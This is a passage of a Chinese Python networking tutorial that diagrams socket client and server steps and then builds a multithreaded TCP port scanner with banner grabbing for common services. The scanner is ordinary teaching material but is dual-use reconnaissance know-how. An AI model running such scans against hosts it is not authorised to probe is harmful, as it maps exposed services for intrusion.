↓<br>┌─────────────┐<br>│ 开始监听    │ <span class="hljs-keyword">listen</span>(<span class="hljs-number">5</span>)<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 等待连接    │ <span class="hljs-keyword">accept</span>() ← 阻塞等待<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 收发数据    │ <span class="hljs-keyword">recv</span>() / <span class="hljs-keyword">send</span>()<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 关闭连接    │ <span class="hljs-keyword">close</span>()<br>└─────────────┘<br></code></pre></td></tr></table></figure><h4 id="客户端">客户端</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">1</span>. 创建Socket<br><span class="hljs-number">2</span>. 连接服务器（<span class="hljs-keyword">connect</span>）<br><span class="hljs-number">3</span>. 收发数据（<span class="hljs-keyword">recv</span>/<span class="hljs-keyword">send</span>）<br><span class="hljs-number">4</span>. 关闭连接（<span class="hljs-keyword">close</span>）<br><br>┌─────────────┐<br>│ 创建Socket  │<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 连接服务器  │ <span class="hljs-keyword">connect</span>((<span class="hljs-string">&#x27;server_ip&#x27;</span>, <span class="hljs-number">8888</span>))<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 收发数据    │ <span class="hljs-keyword">recv</span>() / <span class="hljs-keyword">send</span>()<br>└──────┬──────┘<br>       ↓<br>┌─────────────┐<br>│ 关闭连接    │ <span class="hljs-keyword">close</span>()<br>└─────────────┘<br></code></pre></td></tr></table></figure><h2 id="🔧-实战项目：端口扫描器">🔧 实战项目：端口扫描器</h2><p>让我们编写一个功能强大的端口扫描器！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day11_port_scanner.py</span><br><span class="hljs-comment"># 功能：端口扫描器</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PortScanner</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;端口扫描器&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 常用端口和服务的映射</span><br>        <span class="hljs-variable language_">self</span>.common_ports = &#123;<br>            <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;FTP-DATA&#x27;</span>,<br>            <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;FTP&#x27;</span>,<br>            <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;SSH&#x27;</span>,<br>            <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;Telnet&#x27;</span>,<br>            <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;SMTP&#x27;</span>,<br>            <span class="hljs-number">53</span>: <span class="hljs-string">&#x27;DNS&#x27;</span>,<br>            <span class="hljs-number">80</span>: <span class="hljs-string">&#x27;HTTP&#x27;</span>,<br>            <span class="hljs-number">110</span>: <span class="hljs-string">&#x27;POP3&#x27;</span>,<br>            <span class="hljs-number">143</span>: <span class="hljs-string">&#x27;IMAP&#x27;</span>,<br>            <span class="hljs-number">443</span>: <span class="hljs-string">&#x27;HTTPS&#x27;</span>,<br>            <span class="hljs-number">445</span>: <span class="hljs-string">&#x27;SMB&#x27;</span>,<br>            <span class="hljs-number">3306</span>: <span class="hljs-string">&#x27;MySQL&#x27;</span>,<br>            <span class="hljs-number">3389</span>: <span class="hljs-string">&#x27;RDP&#x27;</span>,<br>            <span class="hljs-number">5432</span>: <span class="hljs-string">&#x27;PostgreSQL&#x27;</span>,<br>            <span class="hljs-number">6379</span>: <span class="hljs-string">&#x27;Redis&#x27;</span>,<br>            <span class="hljs-number">8080</span>: <span class="hljs-string">&#x27;HTTP-Proxy&#x27;</span>,<br>            <span class="hljs-number">27017</span>: <span class="hljs-string">&#x27;MongoDB&#x27;</span>,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">self, host, port, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        扫描单个端口</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 目标主机</span><br><span class="hljs-string">            port: 端口号</span><br><span class="hljs-string">            timeout: 超时时间（秒）</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            (port, is_open, service_name) 元组</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 创建TCP Socket</span><br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(timeout)<br><br>            <span class="hljs-comment"># 尝试连接</span><br>            result = sock.connect_ex((host, port))<br><br>            <span class="hljs-comment"># 关闭连接</span><br>            sock.close()<br><br>            <span class="hljs-comment"># result = 0 表示连接成功（端口开放）</span><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                service = <span class="hljs-variable language_">self</span>.common_ports.get(port, <span class="hljs-string">&#x27;Unknown&#x27;</span>)<br>                <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">True</span>, service)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-keyword">except</span> socket.timeout:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> socket.error:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> (port, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port_with_banner</span>(<span class="hljs-params">self, host, port, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        扫描端口并尝试获取服务banner</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 目标主机</span><br><span class="hljs-string">            port: 端口号</span><br><span class="hljs-string">            timeout: 超时时间</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            (port, is_open, service_name, banner)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        port_result = <span class="hljs-variable language_">self</span>.scan_port(host, port, timeout)<br>        port_num, is_open, service = port_result<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_open:<br>            <span class="hljs-keyword">return</span> (port_num, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># 尝试获取banner</span><br>        banner = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">2</span>)<br>            sock.connect((host, port))<br><br>            <span class="hljs-comment"># 发送简单的请求</span><br>            <span class="hljs-keyword">if</span> port == <span class="hljs-number">80</span> <span class="hljs-keyword">or</span> port == <span class="hljs-number">8080</span>:<br>                sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.0\r\n\r\n&#x27;</span>)<br><br>            <span class="hljs-comment"># 尝试接收响应</span><br>            banner = sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>).strip()<br>            sock.close()<br><br>            <span class="hljs-comment"># 只保留第一行</span><br>            <span class="hljs-keyword">if</span> banner:<br>                banner = banner.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>]<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> (port_num, is_open, service, banner)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_range</span>(<span class="hljs-params">self, host, start_port, end_port, timeout=<span class="hljs-number">1</span>, show_closed=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        扫描端口范围</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 目标主机</span><br><span class="hljs-string">            start_port: 起始端口</span><br><span class="hljs-string">            end_port: 结束端口</span><br><span class="hljs-string">            timeout: 超时时间</span><br><span class="hljs-string">            show_closed: 是否显示关闭的端口</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            开放端口列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔍 正在扫描 <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;start_port&#125;</span>-<span class="hljs-subst">&#123;end_port&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⏳ 请稍候...\n&quot;</span>)<br><br>        open_ports = []<br>        total_ports = end_port - start_port + <span class="hljs-number">1</span><br>        scanned = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># 使用线程池并发扫描</span><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>            <span class="hljs-comment"># 提交所有扫描任务</span><br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.scan_port, host, port, timeout): port<br>                <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start_port, end_port + <span class="hljs-number">1</span>)<br>            &#125;<br><br>            <span class="hljs-comment"># 处理完成的任务</span><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                scanned += <span class="hljs-number">1</span><br>                port_num, is_open, service = future.result()<br><br>                <span class="hljs-keyword">if</span> is_open:<br>                    open_ports.append((port_num, service))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 端口 <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> 开放 - <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">elif</span> show_closed:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 端口 <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> 关闭&quot;</span>)<br><br>                <span class="hljs-comment"># 显示进度</span><br>                <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">50</span> == <span class="hljs-number">0</span>:<br>                    progress = (scanned / total_ports) * <span class="hljs-number">100</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   进度: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total_ports&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span> open_ports<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_common_ports</span>(<span class="hljs-params">self, host, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        扫描常用端口</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 目标主机</span><br><span class="hljs-string">            timeout: 超时时间</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回：</span><br><span class="hljs-string">            开放端口列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔍 正在扫描 <span class="hljs-subst">&#123;host&#125;</span> 的常用端口&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📋 共 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.common_ports)&#125;</span> 个常用端口\n&quot;</span>)<br><br>        open_ports = []<br><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.scan_port_with_banner, host, port, timeout): port<br>                <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.common_ports.keys()<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                port_num, is_open, service, banner = future.result()<br><br>                <span class="hljs-keyword">if</span> is_open:<br>                    open_ports.append((port_num, service, banner))<br>                    <span class="hljs-keyword">if</span> banner:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 端口 <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> 开放 - <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;banner&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 端口 <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> 开放 - <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> open_ports<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display_results</span>(<span class="hljs-params">self, host, open_ports</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        显示扫描结果</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 主机地址</span><br><span class="hljs-string">            open_ports: 开放端口列表</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;扫描结果 - <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">if</span> open_ports:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n发现 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(open_ports)&#125;</span> 个开放端口:\n&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;端口&#x27;</span>:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;服务&#x27;</span>:&lt;<span class="hljs-number">20</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;备注&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>            <span class="hljs-keyword">for</span> port_info <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(open_ports):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(port_info) == <span class="hljs-number">2</span>:<br>                    port, service = port_info<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">20</span>&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(port_info) == <span class="hljs-number">3</span>:<br>                    port, service, banner = port_info<br>                    banner_str = banner[:<span class="hljs-number">40</span>] <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">20</span>&#125;</span> <span class="hljs-subst">&#123;banner_str&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n❌ 未发现开放端口&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    scanner = PortScanner()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口扫描器&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请选择扫描模式:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 扫描常用端口（推荐）&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 扫描端口范围&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 扫描单个端口&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. 退出&quot;</span>)<br><br>    choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入选项: &quot;</span>).strip()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n再见！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 获取目标主机</span><br>    host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n请输入目标主机（IP或域名）: &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 主机不能为空&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 验证主机是否可达</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🔍 正在检查主机 <span class="hljs-subst">&#123;host&#125;</span> 是否可达...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;✅ 主机可达&quot;</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 无法解析主机名&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>()<br>    start_time = time.time()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        <span class="hljs-comment"># 扫描常用端口</span><br>        open_ports = scanner.scan_common_ports(host)<br>        scanner.display_results(host, open_ports)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>        <span class="hljs-comment"># 扫描端口范围</span><br>        start_port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入起始端口: &quot;</span>).strip())<br>        end_port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入结束端口: &quot;</span>).strip())<br><br>        <span class="hljs-keyword">if</span> start_port &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> end_port &gt; <span class="hljs-number">65535</span> <span class="hljs-keyword">or</span> start_port &gt; end_port:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 端口范围无效&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        open_ports = scanner.scan_range(host, start_port, end_port)<br>        scanner.display_results(host, open_ports)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>        <span class="hljs-comment"># 扫描单个端口</span><br>        port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入端口号: &quot;</span>).strip())<br><br>        <span class="hljs-keyword">if</span> port &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> port &gt; <span class="hljs-number">65535</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 端口号无效&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        port_num, is_open, service, banner = scanner.scan_port_with_banner(host, port)<br><br>        <span class="hljs-keyword">if</span> is_open:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n✅ 端口 <span class="hljs-subst">&#123;port&#125;</span> 开放&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   服务: <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> banner:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   Banner: <span class="hljs-subst">&#123;banner&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n❌ 端口 <span class="hljs-subst">&#123;port&#125;</span> 关闭&quot;</span>)<br><br>    <span class="hljs-comment"># 显示耗时</span><br>    elapsed_time = time.time() - start_time<br>    <span 